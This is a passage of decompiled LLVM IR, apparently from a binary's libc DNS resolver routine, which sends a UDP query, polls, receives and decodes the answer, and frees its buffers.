  br label %dec_label_pc_10008a34

dec_label_pc_10008a34:                            ; preds = %dec_label_pc_10008a34thread-pre-split, %dec_label_pc_10008a2c
  %v3_10008a34 = phi i16 [ %v3_10008a34.pr, %dec_label_pc_10008a34thread-pre-split ], [ 10, %dec_label_pc_10008a2c ]
  %v3_10008a38 = icmp eq i16 %v3_10008a34, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_10008a38, label %dec_label_pc_10008a60, label %dec_label_pc_10008a4c

dec_label_pc_10008a4c:                            ; preds = %dec_label_pc_10008a34
  %v0_10008a50 = load i32, i32* @r29, align 4
  store i32 268470876, i32* @lr, align 4
  %v1_10008a58 = call i32 @inet_addr(i32 %v0_10008a50)
  %v3_10008a60.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10008a60

dec_label_pc_10008a60:                            ; preds = %dec_label_pc_10008a34, %dec_label_pc_10008a4c
  %v3_10008a60 = phi i16 [ 10, %dec_label_pc_10008a34 ], [ %v3_10008a60.pre, %dec_label_pc_10008a4c ]
  %v4_10008a60 = sext i16 %v3_10008a60 to i32
  store i32 268470896, i32* @lr, align 4
  %v3_10008a6c = call i32 @socket(i32 %v4_10008a60, i32 2, i32 17)
  store i32 %v3_10008a6c, i32* @r19, align 4
  %v1_10008a70 = icmp slt i32 %v3_10008a6c, 0
  br i1 %v1_10008a70, label %dec_label_pc_10008a9c, label %dec_label_pc_10008a78

dec_label_pc_10008a78:                            ; preds = %dec_label_pc_10008a60
  store i32 268470916, i32* @lr, align 4
  %v3_10008a80 = call i32 @__libc_connect(i32 %v2_10008a78, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_10008a80, -1
  br i1 %tmp60, label %dec_label_pc_10008aa4, label %dec_label_pc_10008a8c

dec_label_pc_10008a8c:                            ; preds = %dec_label_pc_10008a78
  %v0_10008a8c = call i32 @__errno_location()
  %v1_10008a90 = inttoptr i32 %v0_10008a8c to i32*
  %v2_10008a90 = load i32, i32* %v1_10008a90, align 4
  store i32 %v2_10008a90, i32* %r0.global-to-local, align 4
  %v3_10008a94 = icmp eq i32 %v2_10008a90, 101
  br i1 %v3_10008a94, label %dec_label_pc_10008ddc, label %dec_label_pc_10008a9c

dec_label_pc_10008a9c:                            ; preds = %dec_label_pc_10008a8c, %dec_label_pc_10008a60
  %v0_10008a9c = load i32, i32* %r18.global-to-local, align 4
  %v1_10008a9c = add i32 %v0_10008a9c, 1
  store i32 %v1_10008a9c, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_10008a9c, 3
  br i1 %tmp61, label %dec_label_pc_100088ec, label %dec_label_pc_10008e10

dec_label_pc_10008aa4:                            ; preds = %dec_label_pc_10008a78
  %v0_10008aa4 = load i32, i32* @r28, align 4
  %v1_10008aa4 = load i32, i32* @r27, align 4
  %v2_10008aa4 = add i32 %v1_10008aa4, %v0_10008aa4
  %v0_10008aa8 = load i32, i32* @r30, align 4
  %v0_10008ab0 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_10008ab8.443 to i32), i32* @lr, align 4
  %v4_10008ab4 = call i32 @__libc_send(i32 %v0_10008ab0, i32 %v0_10008aa8, i32 %v2_10008aa4, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10008acc = load i32, i32* @r19, align 4
  store i32 %v0_10008acc, i32* %stack_var_-248, align 4
  store i32 268470996, i32* @lr, align 4
  %v3_10008ad0 = call i32 @__libc_poll(i32 %v2_10008abc, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_10008ad0, 1
  br i1 %tmp62, label %dec_label_pc_10008ddc, label %dec_label_pc_10008adc

dec_label_pc_10008adc:                            ; preds = %dec_label_pc_10008aa4
  %v0_10008adc = load i32, i32* @r19, align 4
  %v0_10008ae0 = load i32, i32* @r30, align 4
  store i32 268471024, i32* @lr, align 4
  %v4_10008aec = call i32 @__libc_recv(i32 %v0_10008adc, i32 %v0_10008ae0, i32 512, i32 0)
  store i32 %v4_10008aec, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_10008aec, 12
  br i1 %tmp63, label %dec_label_pc_10008d84, label %dec_label_pc_10008afc

dec_label_pc_10008afc:                            ; preds = %dec_label_pc_10008adc
  %v0_10008afc = load i32, i32* @r30, align 4
  %v2_10008b04 = inttoptr i32 %v0_10008afc to i8*
  %v3_10008b04 = call i32 @__decode_header(i8* %v2_10008b04, i32 %v2_10008904)
  %v3_10008b08 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_10008b08, i32* @r20, align 4
  %v1_10008b0c = load i32, i32* @r25, align 4
  %v4_10008b0c = icmp eq i32 %v3_10008b08, %v1_10008b0c
  br i1 %v4_10008b0c, label %dec_label_pc_10008b14, label %dec_label_pc_10008d84

dec_label_pc_10008b14:                            ; preds = %dec_label_pc_10008afc
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_10008b18, label %dec_label_pc_10008d84, label %dec_label_pc_10008b20

dec_label_pc_10008b20:                            ; preds = %dec_label_pc_10008b14
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_10008b24, label %dec_label_pc_10008b2c, label %dec_label_pc_10008b94

dec_label_pc_10008b2c:                            ; preds = %dec_label_pc_10008b20
  %v0_10008b2c = load i32, i32* %r17.global-to-local, align 4
  %v3_10008b2c = icmp eq i32 %v0_10008b2c, 0
  br i1 %v3_10008b2c, label %dec_label_pc_10008b34, label %dec_label_pc_10008b88

dec_label_pc_10008b34:                            ; preds = %dec_label_pc_10008b2c
  store i32 ptrtoint (i32* @global_var_1001d798.384 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10008890, i32* %r28.global-to-local, align 4
  store i32 %v2_10008890, i32* @r3, align 4
  %v0_10008b50 = call i32 @__pthread_return_void()
  %v0_10008b58 = call i32 @__pthread_return_0()
  %v3_10008b60 = load i32, i32* @global_var_1001d88c.438, align 4
  store i32 %v2_10008890, i32* @r3, align 4
  %v1_10008b6c = add i32 %v3_10008b60, -1
  store i32 %v1_10008b6c, i32* %r29.global-to-local, align 4
  %v0_10008b70 = call i32 @__pthread_return_void()
  %v0_10008b74 = load i32, i32* @r22, align 4
  %v2_10008b74 = icmp slt i32 %v0_10008b74, %v1_10008b6c
  br i1 %v2_10008b74, label %dec_label_pc_10008b7c, label %dec_label_pc_10008b88

dec_label_pc_10008b7c:                            ; preds = %dec_label_pc_10008b34
  %v1_10008b7c = add i32 %v0_10008b74, 1
  store i32 %v1_10008b7c, i32* @r22, align 4
  %v0_10008b80 = load i32, i32* @r20, align 4
  store i32 %v0_10008b80, i32* @r25, align 4
  br label %dec_label_pc_10008df8thread-pre-split.backedge

dec_label_pc_10008b88:                            ; preds = %dec_label_pc_10008b34, %dec_label_pc_10008b2c
  %v0_10008b88 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10008bbc

dec_label_pc_10008b94:                            ; preds = %dec_label_pc_10008b20
  br i1 %v3_10008b94, label %dec_label_pc_10008b9c, label %dec_label_pc_10008d84

dec_label_pc_10008b9c:                            ; preds = %dec_label_pc_10008b94
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_10008bb4, label %dec_label_pc_10008ba8

dec_label_pc_10008ba8:                            ; preds = %dec_label_pc_10008b9c
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_10008bd410 = load i32, i32* @r30, align 4
  store i32 %v0_10008bd410, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008bc4

dec_label_pc_10008bb4:                            ; preds = %dec_label_pc_10008b9c
  %v0_10008bb4 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10008bbc

dec_label_pc_10008bbc:                            ; preds = %dec_label_pc_10008b88, %dec_label_pc_10008bb4
  %storemerge3 = phi i32 [ %v0_10008bb4, %dec_label_pc_10008bb4 ], [ %v0_10008b88, %dec_label_pc_10008b88 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_10008bb4 ], [ 1, %dec_label_pc_10008b88 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_10008bbc = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_10008bbc, align 4
  br label %dec_label_pc_10008e20

dec_label_pc_10008bc4:                            ; preds = %dec_label_pc_10008ba8, %dec_label_pc_10008bc4
  %v0_10008bd414 = phi i32 [ %v0_10008bd410, %dec_label_pc_10008ba8 ], [ %v0_10008bd4, %dec_label_pc_10008bc4 ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_10008ba8 ], [ %v2_10008bc8, %dec_label_pc_10008bc4 ]
  store i32 268471240, i32* @lr, align 4
  %v2_10008bc4 = call i32 @__length_question(i32 %v0_10008bd414, i32 %storemerge213)
  %v0_10008bc8 = load i32, i32* %r28.global-to-local, align 4
  %v2_10008bc8 = add i32 %v0_10008bc8, %v2_10008bc4
  %v0_10008bd8.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_10008bc8, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10008bc8, i32* @r4, align 4
  %v0_10008bd4 = load i32, i32* @r30, align 4
  store i32 %v0_10008bd4, i32* @r3, align 4
  %v2_10008bd8 = icmp slt i32 %v0_10008bd8.pr, 1
  %v1_10008bdc = add i32 %v0_10008bd8.pr, 1
  store i32 %v1_10008bdc, i32* %r29.global-to-local, align 4
  br i1 %v2_10008bd8, label %dec_label_pc_10008bc4, label %dec_label_pc_10008be4

dec_label_pc_10008be4:                            ; preds = %dec_label_pc_10008bc4
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_10008ba0, label %dec_label_pc_10008d30, label %dec_label_pc_10008d38

dec_label_pc_10008bf4:                            ; preds = %dec_label_pc_10008d30
  store i32 %v2_10008bf4, i32* %r29.global-to-local, align 4
  %v0_10008bf8 = load i32, i32* @r30, align 4
  store i32 268471308, i32* @lr, align 4
  %v5_10008c08 = call i32 @__decode_answer(i32 %v0_10008bf8, i32 %v0_10008bfc, i32 %v1_10008d30, i32* nonnull %stack_var_-184)
  store i32 %v5_10008c08, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_10008c08, -1
  br i1 %tmp64, label %dec_label_pc_10008c2c, label %dec_label_pc_10008c14

dec_label_pc_10008c14:                            ; preds = %dec_label_pc_10008bf4
  %v0_10008c14 = load i32, i32* @r24, align 4
  %v3_10008c14 = icmp eq i32 %v0_10008c14, 0
  br i1 %v3_10008c14, label %dec_label_pc_10008d84, label %dec_label_pc_10008c1c

dec_label_pc_10008c1c:                            ; preds = %dec_label_pc_10008c14
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_10008c20, label %dec_label_pc_10008d84, label %dec_label_pc_10008d38

dec_label_pc_10008c2c:                            ; preds = %dec_label_pc_10008bf4
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_10008c30 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_10008c30, label %dec_label_pc_10008cd4, label %dec_label_pc_10008c38

dec_label_pc_10008c38:                            ; preds = %dec_label_pc_10008c2c
  %v0_10008c38 = load i32, i32* @r31, align 4
  store i32 %v2_10008bf4, i32* @r4, align 4
  %v1_10008c40 = add i32 %v0_10008c38, 28
  %v2_10008c40 = inttoptr i32 %v1_10008c40 to i32*
  %v3_10008c40 = load i32, i32* %v2_10008c40, align 4
  store i32 %v3_10008c40, i32* %r0.global-to-local, align 4
  store i32 %v0_10008c38, i32* @r3, align 4
  %v1_10008c48 = add i32 %v0_10008c38, 36
  %v2_10008c48 = inttoptr i32 %v1_10008c48 to i32*
  %v3_10008c48 = load i32, i32* %v2_10008c48, align 4
  store i32 %v3_10008c48, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268471392, i32* @lr, align 4
  %v0_10008c5c = call i32 @memcpy()
  %v0_10008c60 = load i32, i32* @r31, align 4
  %v1_10008c60 = add i32 %v0_10008c60, 4
  %v2_10008c60 = inttoptr i32 %v1_10008c60 to i32*
  %v3_10008c60 = load i32, i32* %v2_10008c60, align 4
  %v3_10008c64 = icmp eq i32 %v3_10008c60, 24
  br i1 %v3_10008c64, label %dec_label_pc_10008c38.dec_label_pc_10008c88_crit_edge, label %dec_label_pc_10008c6c

dec_label_pc_10008c38.dec_label_pc_10008c88_crit_edge: ; preds = %dec_label_pc_10008c38
  %v1_10008c88.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10008c88

dec_label_pc_10008c6c:                            ; preds = %dec_label_pc_10008c38
  %v1_10008c6c = add i32 %v0_10008c60, 28
  %v2_10008c6c = inttoptr i32 %v1_10008c6c to i32*
  %v3_10008c6c = load i32, i32* %v2_10008c6c, align 4
  store i32 %v3_10008c6c, i32* %r0.global-to-local, align 4
  %v3_10008c70 = icmp eq i32 %v3_10008c6c, 0
  br i1 %v3_10008c70, label %dec_label_pc_10008d38, label %dec_label_pc_10008c78

dec_label_pc_10008c78:                            ; preds = %dec_label_pc_10008c6c
  %v0_10008c78 = load i32, i32* %r16.global-to-local, align 4
  %v3_10008c78 = icmp eq i32 %v0_10008c78, 1
  br i1 %v3_10008c78, label %dec_label_pc_10008c88, label %dec_label_pc_10008c80

dec_label_pc_10008c80:                            ; preds = %dec_label_pc_10008c78
  %v3_10008c80 = icmp eq i32 %v0_10008c78, 28
  br i1 %v3_10008c80, label %dec_label_pc_10008c88, label %dec_label_pc_10008d38

dec_label_pc_10008c88:                            ; preds = %dec_label_pc_10008c38.dec_label_pc_10008c88_crit_edge, %dec_label_pc_10008c80, %dec_label_pc_10008c78
  %v1_10008c88 = phi i32 [ %v1_10008c88.pre, %dec_label_pc_10008c38.dec_label_pc_10008c88_crit_edge ], [ 28, %dec_label_pc_10008c80 ], [ 1, %dec_label_pc_10008c78 ]
  %v4_10008c88 = icmp eq i32 %v3_10008c60, %v1_10008c88
  br i1 %v4_10008c88, label %dec_label_pc_10008c9c, label %dec_label_pc_10008c90

dec_label_pc_10008c90:                            ; preds = %dec_label_pc_10008c88
  %v1_10008c90 = inttoptr i32 %v0_10008c60 to i32*
  %v2_10008c90 = load i32, i32* %v1_10008c90, align 4
  store i32 %v2_10008c90, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10008c98.446 to i32), i32* @lr, align 4
  %v0_10008c94 = call i32 @free()
  br label %dec_label_pc_10008d1c

dec_label_pc_10008c9c:                            ; preds = %dec_label_pc_10008c88
  %v1_10008ca0 = add i32 %v0_10008c60, 16
  %v2_10008ca0 = inttoptr i32 %v1_10008ca0 to i32*
  %v3_10008ca0 = load i32, i32* %v2_10008ca0, align 4
  store i32 %v3_10008ca0, i32* %r11.global-to-local, align 4
  %v0_10008ca4 = load i32, i32* @r24, align 4
  %v2_10008ca4 = sub i32 %tmp35, %v0_10008ca4
  %v1_10008ca8 = add i32 %v0_10008c60, 32
  %v2_10008ca8 = inttoptr i32 %v1_10008ca8 to i32*
  %v3_10008ca8 = load i32, i32* %v2_10008ca8, align 4
  store i32 %v3_10008ca8, i32* %r0.global-to-local, align 4
  %v1_10008cac = add i32 %v2_10008ca4, -1
  %v1_10008cb0 = add i32 %v3_10008ca0, 4
  %v2_10008cb4 = mul i32 %v1_10008cac, %v1_10008cb0
  store i32 %v2_10008cb4, i32* %r11.global-to-local, align 4
  %v2_10008cb8 = add i32 %v0_10008c60, 36
  %v3_10008cb8 = inttoptr i32 %v2_10008cb8 to i32*
  store i32 %v1_10008cac, i32* %v3_10008cb8, align 4
  %v0_10008cbc = load i32, i32* %r11.global-to-local, align 4
  %v1_10008cbc = load i32, i32* %r0.global-to-local, align 4
  %v3_10008cbc = icmp ugt i32 %v0_10008cbc, %v1_10008cbc
  br i1 %v3_10008cbc, label %dec_label_pc_10008d38, label %dec_label_pc_10008cc4

dec_label_pc_10008cc4:                            ; preds = %dec_label_pc_10008c9c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10008ccc = load i32, i32* @r31, align 4
  %v2_10008ccc = add i32 %v1_10008ccc, 36
  %v3_10008ccc = inttoptr i32 %v2_10008ccc to i32*
  store i32 0, i32* %v3_10008ccc, align 4
  br label %dec_label_pc_10008d1c

dec_label_pc_10008cd4:                            ; preds = %dec_label_pc_10008c2c
  %v3_10008cd4 = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_10008cd4, i32* @r3, align 4
  store i32 268471516, i32* @lr, align 4
  %v0_10008cd8 = call i32 @free()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_10008ce0 = load i32, i32* %r16.global-to-local, align 4
  %v4_10008ce0 = icmp eq i32 %tmp29, %v1_10008ce0
  br i1 %v4_10008ce0, label %dec_label_pc_10008ce8, label %dec_label_pc_10008d1c

dec_label_pc_10008ce8:                            ; preds = %dec_label_pc_10008cd4
  %v0_10008ce8 = load i32, i32* @r31, align 4
  %v1_10008ce8 = add i32 %v0_10008ce8, 16
  %v2_10008ce8 = inttoptr i32 %v1_10008ce8 to i32*
  %v3_10008ce8 = load i32, i32* %v2_10008ce8, align 4
  store i32 %v3_10008ce8, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_10008cf0 = icmp eq i32 %v3_10008ce8, %tmp28
  br i1 %v4_10008cf0, label %dec_label_pc_10008cf8, label %dec_label_pc_10008d7c

dec_label_pc_10008cf8:                            ; preds = %dec_label_pc_10008ce8
  %v1_10008cf8 = add i32 %v0_10008ce8, 36
  %v2_10008cf8 = inttoptr i32 %v1_10008cf8 to i32*
  %v3_10008cf8 = load i32, i32* %v2_10008cf8, align 4
  %v1_10008cfc = add i32 %v0_10008ce8, 28
  %v2_10008cfc = inttoptr i32 %v1_10008cfc to i32*
  %v3_10008cfc = load i32, i32* %v2_10008cfc, align 4
  store i32 %v3_10008cfc, i32* %r0.global-to-local, align 4
  %v2_10008d00 = mul i32 %v3_10008cf8, %tmp28
  %v2_10008d08 = add i32 %v3_10008cfc, %v2_10008d00
  store i32 %v2_10008d08, i32* @r3, align 4
  store i32 268471568, i32* @lr, align 4
  %v0_10008d0c = call i32 @memcpy()
  %v0_10008d10 = load i32, i32* @r31, align 4
  %v1_10008d10 = add i32 %v0_10008d10, 36
  %v2_10008d10 = inttoptr i32 %v1_10008d10 to i32*
  %v3_10008d10 = load i32, i32* %v2_10008d10, align 4
  %v1_10008d14 = add i32 %v3_10008d10, 1
  store i32 %v1_10008d14, i32* %v2_10008d10, align 4
  br label %dec_label_pc_10008d1c

dec_label_pc_10008d1c:                            ; preds = %dec_label_pc_10008cd4, %dec_label_pc_10008cc4, %dec_label_pc_10008c90, %dec_label_pc_10008cf8
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10008cf8 ], [ 0, %dec_label_pc_10008cd4 ], [ 0, %dec_label_pc_10008cc4 ], [ %stack_var_-88.118, %dec_label_pc_10008c90 ]
  %v0_10008d1c = load i32, i32* @r28, align 4
  %v1_10008d1c = load i32, i32* %r15.global-to-local, align 4
  %v2_10008d1c = add i32 %v1_10008d1c, %v0_10008d1c
  store i32 %v2_10008d1c, i32* %r28.global-to-local, align 4
  %v0_10008d20 = load i32, i32* @r24, align 4
  %v1_10008d20 = add i32 %v0_10008d20, 1
  store i32 %v1_10008d20, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_10008d28 = icmp slt i32 %v1_10008d20, %tmp35
  br i1 %v2_10008d28, label %dec_label_pc_10008d30, label %dec_label_pc_10008d38

dec_label_pc_10008d30:                            ; preds = %dec_label_pc_10008be4, %dec_label_pc_10008d1c
  %v0_10008bfc = phi i32 [ %v2_10008d1c, %dec_label_pc_10008d1c ], [ %v2_10008bc8, %dec_label_pc_10008be4 ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_10008d1c ], [ 1, %dec_label_pc_10008be4 ]
  %v1_10008d30 = load i32, i32* @r27, align 4
  %v2_10008d30 = icmp slt i32 %v0_10008bfc, %v1_10008d30
  br i1 %v2_10008d30, label %dec_label_pc_10008bf4, label %dec_label_pc_10008d38

dec_label_pc_10008d38:                            ; preds = %dec_label_pc_10008c1c, %dec_label_pc_10008be4, %dec_label_pc_10008d30, %dec_label_pc_10008c6c, %dec_label_pc_10008c9c, %dec_label_pc_10008d1c, %dec_label_pc_10008c80
  %v0_10008d38 = load i32, i32* @r19, align 4
  store i32 268471616, i32* @lr, align 4
  %v1_10008d3c = call i32 @__libc_close(i32 %v0_10008d38)
  %v3_10008d44 = icmp eq i32 %arg5, 0
  %v0_10008d54 = load i32, i32* @r30, align 4
  br i1 %v3_10008d44, label %dec_label_pc_10008d54, label %dec_label_pc_10008d4c

dec_label_pc_10008d4c:                            ; preds = %dec_label_pc_10008d38
  %v2_10008d4c = inttoptr i32 %arg5 to i32*
  store i32 %v0_10008d54, i32* %v2_10008d4c, align 4
  br label %dec_label_pc_10008d5c

dec_label_pc_10008d54:                            ; preds = %dec_label_pc_10008d38
  store i32 %v0_10008d54, i32* @r3, align 4
  store i32 268471644, i32* @lr, align 4
  %v0_10008d58 = call i32 @free()
  br label %dec_label_pc_10008d5c

dec_label_pc_10008d5c:                            ; preds = %dec_label_pc_10008d4c, %dec_label_pc_10008d54
  %v0_10008d5c = load i32, i32* @r21, align 4
  store i32 %v0_10008d5c, i32* @r3, align 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 268471656, i32* @lr, align 4
  %v0_10008d64 = call i32 @free()
  store i32 ptrtoint (i32* @global_var_1001feb4.434 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008e60

dec_label_pc_10008d7c:                            ; preds = %dec_label_pc_10008ce8
  %v1_10008d7c = inttoptr i32 %v0_10008ce8 to i32*
  %v2_10008d7c = load i32, i32* %v1_10008d7c, align 4
  store i32 %v2_10008d7c, i32* @r3, align 4
  store i32 268471684, i32* @lr, align 4
  %v0_10008d80 = call i32 @free()
  br label %dec_label_pc_10008d84

dec_label_pc_10008d84:                            ; preds = %dec_label_pc_10008b94, %dec_label_pc_10008afc, %dec_label_pc_10008c1c, %dec_label_pc_10008c14, %dec_label_pc_10008b14, %dec_label_pc_10008adc, %dec_label_pc_10008d7c
  %v0_10008d84 = load i32, i32* %r17.global-to-local, align 4
  %v3_10008d84 = icmp eq i32 %v0_10008d84, 0
  br i1 %v3_10008d84, label %dec_label_pc_10008d8c, label %dec_label_pc_10008ddc

dec_label_pc_10008d8c:                            ; preds = %dec_label_pc_10008d84
  store i32 ptrtoint (i32* @global_var_1001d798.384 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10008890, i32* %r28.global-to-local, align 4
  store i32 %v2_10008890, i32* @r3, align 4
  %v0_10008da8 = call i32 @__pthread_return_void()
  %v0_10008db0 = call i32 @__pthread_return_0()
  %v3_10008db8 = load i32, i32* @global_var_1001d88c.438, align 4
  store i32 %v2_10008890, i32* @r3, align 4
  %v1_10008dc4 = add i32 %v3_10008db8, -1
  store i32 %v1_10008dc4, i32* %r29.global-to-local, align 4
  %v0_10008dc8 = call i32 @__pthread_return_void()
  %v0_10008dcc = load i32, i32* @r22, align 4
  %v2_10008dcc = icmp slt i32 %v0_10008dcc, %v1_10008dc4
  br i1 %v2_10008dcc, label %dec_label_pc_10008dd4, label %dec_label_pc_10008ddc

dec_label_pc_10008dd4:                            ; preds = %dec_label_pc_10008d8c
  %v1_10008dd4 = add i32 %v0_10008dcc, 1
  store i32 %v1_10008dd4, i32* @r22, align 4
  br label %dec_label_pc_10008df8thread-pre-split.backedge

dec_label_pc_10008df8thread-pre-split.backedge:   ; preds = %dec_label_pc_10008dd4, %dec_label_pc_10008b7c, %dec_label_pc_10008df4
  %v0_10008df8.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_10008df8.pr, 3
  br i1 %tmp65, label %dec_label_pc_100088ec.lr.ph, label %dec_label_pc_10008e10

dec_label_pc_10008ddc:                            ; preds = %dec_label_pc_10008a8c, %dec_label_pc_10008d8c, %dec_label_pc_10008d84, %dec_label_pc_10008aa4
  %v0_10008ddc = load i32, i32* @r26, align 4
  %v1_10008ddc = add i32 %v0_10008ddc, 1
  store i32 %v1_10008ddc, i32* %r0.global-to-local, align 4
  %v1_10008de0 = load i32, i32* @r23, align 4
  %v2_10008de0 = srem i32 %v1_10008ddc, %v1_10008de0
  store i32 %v2_10008de0, i32* @r26, align 4
  %v5_10008de8 = icmp eq i32 %v2_10008de0, 0
  br i1 %v5_10008de8, label %dec_label_pc_10008df0, label %dec_label_pc_10008df4

dec_label_pc_10008df0:                            ; preds = %dec_label_pc_10008ddc
  %v0_10008df0 = load i32, i32* %r18.global-to-local, align 4
  %v1_10008df0 = add i32 %v0_10008df0, 1
  store i32 %v1_10008df0, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_10008df4

dec_label_pc_10008df4:                            ; preds = %dec_label_pc_10008ddc, %dec_label_pc_10008df0
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_10008df8thread-pre-split.backedge

dec_label_pc_100088ec.lr.ph:                      ; preds = %dec_label_pc_100088ec.lr.ph.lr.ph, %dec_label_pc_10008df8thread-pre-split.backedge
  br label %dec_label_pc_100088ec

dec_label_pc_10008e04:                            ; preds = %dec_label_pc_10008864, %dec_label_pc_1000885c, %dec_label_pc_10008854, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_10008e10

dec_label_pc_10008e10:                            ; preds = %dec_label_pc_10008df8thread-pre-split.backedge, %dec_label_pc_100088fc, %dec_label_pc_100089d8, %dec_label_pc_10008a9c, %dec_label_pc_10008870, %dec_label_pc_10008e04
  %v0_10008e10 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10008e18 = inttoptr i32 %v0_10008e10 to i32*
  store i32 -1, i32* %v2_10008e18, align 4
  %v0_10008e1c = load i32, i32* @r25, align 4
  store i32 %v0_10008e1c, i32* @r20, align 4
  br label %dec_label_pc_10008e20

dec_label_pc_10008e20:                            ; preds = %dec_label_pc_10008bbc, %dec_label_pc_10008e10
  %v0_10008e20 = load i32, i32* @r19, align 4
  %v3_10008e20 = icmp eq i32 %v0_10008e20, -1
  br i1 %v3_10008e20, label %dec_label_pc_10008e30, label %dec_label_pc_10008e28

dec_label_pc_10008e28:                            ; preds = %dec_label_pc_10008e20
  store i32 268471856, i32* @lr, align 4
  %v1_10008e2c = call i32 @__libc_close(i32 %v0_10008e20)
  br label %dec_label_pc_10008e30

dec_label_pc_10008e30:                            ; preds = %dec_label_pc_10008e20, %dec_label_pc_10008e28
  %v0_10008e30 = load i32, i32* @r21, align 4
  store i32 %v0_10008e30, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268471868, i32* @lr, align 4
  %v0_10008e38 = call i32 @free()
  %v0_10008e3c = load i32, i32* @r30, align 4
  store i32 %v0_10008e3c, i32* @r3, align 4
  store i32 268471876, i32* @lr, align 4
  %v0_10008e40 = call i32 @free()
  %v0_10008e44 = load i32, i32* @r26, align 4
  %v3_10008e44 = icmp eq i32 %v0_10008e44, -1
  br i1 %v3_10008e44, label %dec_label_pc_10008e90, label %dec_label_pc_10008e4c

dec_label_pc_10008e4c:                            ; preds = %dec_label_pc_10008e30
  store i32 ptrtoint (i32* @global_var_1001feb4.434 to i32), i32* %r29.global-to-local, align 4
  %v2_10008e58 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_10008e60

dec_label_pc_10008e60:                            ; preds = %dec_label_pc_10008d5c, %dec_label_pc_10008e4c
  %storemerge68 = phi i32 [ %v2_10008e58, %dec_label_pc_10008e4c ], [ %v2_10008890, %dec_label_pc_10008d5c ]
  %v1_10008e64.pre-phi = phi i32 [ %v2_10008e58, %dec_label_pc_10008e4c ], [ %v2_10008890, %dec_label_pc_10008d5c ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_10008e64.pre-phi, i32* @r3, align 4
  %v0_10008e68 = call i32 @__pthread_return_void()
  %v0_10008e70 = call i32 @__pthread_return_0()
  %v0_10008e78 = load i32, i32* @r26, align 4
  store i32 %v0_10008e78, i32* @global_var_1001d884.435, align 4
  store i32 %v1_10008e64.pre-phi, i32* @r3, align 4
  %v0_10008e88 = load i32, i32* @r20, align 4
  %v1_10008e88 = trunc i32 %v0_10008e88 to i16
  store i16 %v1_10008e88, i16* @global_var_1001d794.436, align 2
  %v0_10008e8c = call i32 @__pthread_return_void()
  br label %dec_label_pc_10008e90

dec_label_pc_10008e90:                            ; preds = %dec_label_pc_10008e30, %dec_label_pc_10008e60
  store i32 %v0_10008810, i32* %r0.global-to-local, align 4
  %v0_10008e94 = load i32, i32* @r27, align 4
  ret i32 %v0_10008e94

; uselistorder directives
  uselistorder i32 %v1_10008e64.pre-phi, { 1, 0 }
  uselistorder i32 %v2_10008de0, { 1, 0 }
  uselistorder i32 %v0_10008d54, { 1, 0 }
  uselistorder i32 %v1_10008d30, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_10008bfc, { 1, 0 }
  uselistorder i32 %v1_10008d20, { 1, 0 }
  uselistorder i32 %v0_10008ce8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10008cac, { 1, 0 }
  uselistorder i32 %v0_10008c38, { 2, 1, 0 }
  uselistorder i32 %v0_10008bd4, { 1, 0 }
  uselistorder i32 %v2_10008bc8, { 0, 2, 1, 3 }
